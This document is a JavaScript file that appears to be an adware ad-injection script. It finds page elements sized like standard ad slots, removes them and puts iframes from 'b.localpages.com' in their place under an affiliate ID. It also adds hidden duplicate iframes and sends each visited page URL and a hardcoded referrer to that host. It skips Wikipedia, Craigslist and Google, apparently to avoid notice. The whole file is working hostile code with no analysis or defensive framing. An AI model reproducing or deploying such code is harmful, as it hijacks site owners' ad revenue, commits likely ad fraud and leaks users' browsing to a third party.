(function() {
	var jQuery;

	if (window.jQuery === undefined)
	{
		var s = document.createElement('script');
		s.setAttribute('type', 'text/javascript');
		s.setAttribute('src', '//ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js');
		if (s.readyState)
		{
			s.onreadystatechange = function ()
			{
				if (this.readyState == 'complete' || this.readyState == 'loaded')
				{
					scriptLoadHandler();
				}
			};
		}
		else
		{
			s.onload = scriptLoadHandler;
    	}
    	(document.getElementsByTagName('head')[0] || document.documentElement).appendChild(s);
	}
	else
	{
		jQuery = window.jQuery;
		_AMIN();
	}

	function scriptLoadHandler()
	{
		jQuery = window.jQuery.noConflict(true);
		_AMIN();
	}

	function _AMIN() {
		jQuery(document).ready(function($)
		{
			var _AMIN = {
				begin: new Date(),
				proto: 'https:' == document.location.protocol ? 'https://' : 'http://',
				bannerHost: 'b.localpages.com/banners',
				placementID: '1356197',
				affiliate: '21171',
				subid: '',
				pageUrl: window.location.href,
				pageReferrer: 'http://www.unieuroonline.com.br/moodle2pos/mod/quiz/summary.php?attempt=28210',
								cleanUp: function ()
				{
					var self = this;
					var cnt = 0;
					var e = $('iframe[replaced]').next().andSelf();
					if(e.length > 0)
					{
						e.remove();
					}
					else
					{
						if(cnt < 10000) {
							cnt += 500;
							setTimeout(function ()
							{
								self.cleanUp();
							}, 500);
						}
					}
				},
								e: function (s)
				{
					var e = '';
					l = s.length;
					for (var i = 0; i < l; i++)
					{
						e += s.charCodeAt(i).toString(16);
					}
					return e.split('').reverse().join('');
				},
				init: function ()
				{
					this.parseHTML();
					this.cleanUp();				},
				parseHTML: function ()
				{
					var elements = $('div, iframe, img, ins, object, embed');
					var i = elements.length;
					var cnt = 0;
					
					while (i--)
					{
						if(($(elements[i]).width() == '300' && $(elements[i]).height() == '250') || ($(elements[i]).width() == '160' && $(elements[i]).height() == '600') || ($(elements[i]).width() == '728' && $(elements[i]).height() == '90'))
						{
							this.render($(elements[i]), 'remove');
							cnt++;
						}
					}
					
					console.log(cnt+' in '+((new Date()) - this.begin)+'ms');
				},
				render: function(e, a)
				{
					var w = e.width();
					var h = e.height();
					var s = e;
					var id = e.attr('id') || '';
					var cl = e.attr('class') || '';
					var st = e.attr('style') || '';
					if(id != '')
					{
						id = ' id="'+id+'"';
					}
					if(cl != '')
					{
						cl = ' class="'+cl+'"';
					}
					if(st != '')
					{
						st = ' style="'+st+'"';
					}
					if(this.pageUrl.indexOf('wikipedia.org') != -1 || this.pageUrl.indexOf('craigslist') != -1 || this.pageUrl.indexOf('google.com') != -1)
						throw "No Injection";
										var code = '<div'+id+cl+st+'><iframe src="'+this.proto+this.bannerHost+'/gbanner.php?pid='+this.placementID+'&d=1&aff='+this.affiliate+'&size='+w+'x'+h+this.subid+'&pageUrl='+encodeURIComponent(this.pageUrl)+'&pageReferer='+encodeURIComponent(this.pageReferrer)+'&gb=1" width="'+w+'" height="'+h+'" frameborder="0" scrolling="no"></iframe></div>';
					code += '<div style="display:none;"><iframe src="'+this.proto+this.bannerHost+'/gbanner.php?pid='+this.placementID+'&aff='+this.affiliate+'&size='+w+'x'+h+'&pageUrl='+encodeURIComponent(this.pageUrl)+'&pageReferer='+encodeURIComponent(this.pageReferrer)+'&gb=1" width="'+w+'" height="'+h+'" frameborder="0" scrolling="no"></iframe></div>';
										
					switch(a)
					{
						case 'prepend':
							$(s).html('');
							$(s).prepend(code);
							break;
						case 'append':
							$(s).html('');
							$(s).append(code);
							break;
						case 'before':
							$(s).html('');
							$(s).before(code);
							break;
						case 'after':
							$(s).html('');
							$(s).after(code);
							break;
						case 'remove':
							$(s).before(code);
							$(s).remove();
							break;
					}
				}
			}
			_AMIN.init();
		});
	}
})();
